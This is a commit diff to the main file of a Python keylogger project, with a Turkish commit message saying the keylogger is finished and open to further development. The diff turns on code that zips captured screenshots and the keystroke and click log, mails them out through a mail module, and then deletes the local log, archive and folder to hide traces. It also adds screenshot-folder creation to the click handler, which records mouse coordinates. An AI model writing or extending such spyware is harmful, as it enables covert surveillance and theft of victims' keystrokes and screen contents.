Keylogger projesi bitti geliştirmeye açık

+++ main.py
@@ -5,16 +5,14 @@ import pyautogui
 import mail
 import file_to_zip as zipper
 import shutil
-"""
-# Kullanım örneği
-zipper.klasoru_zip_yap("./picture", "picture.zip")
 
-mail.gönder()
+if os.path.exists("picture") and os.path.exists("log.txt")  :
+    zipper.klasoru_zip_yap("./picture", "picture.zip")
+    mail.gönder()
+    os.remove("log.txt")
+    os.remove("picture.zip")
+    shutil.rmtree("picture")
 
-os.remove("log.txt")
-os.remove("picture.zip")
-shutil.rmtree("picture")
-"""
 
 check = os.path.exists("./log.txt")
 
@@ -39,7 +37,10 @@ def on_click(x, y, button, pressed):
         yazi = "\nfare kordinatları => x = {} , y = {} \t Tuş => {} ".format(x,y,button)
         
         yaz(yazi)
-
+        
+        if not(os.path.exists("picture")):
+            os.mkdir("picture")
+            
         icindekiler = os.listdir('./picture/')
         sayi = len(icindekiler)
         isim = "{}.jpg".format(sayi+1)
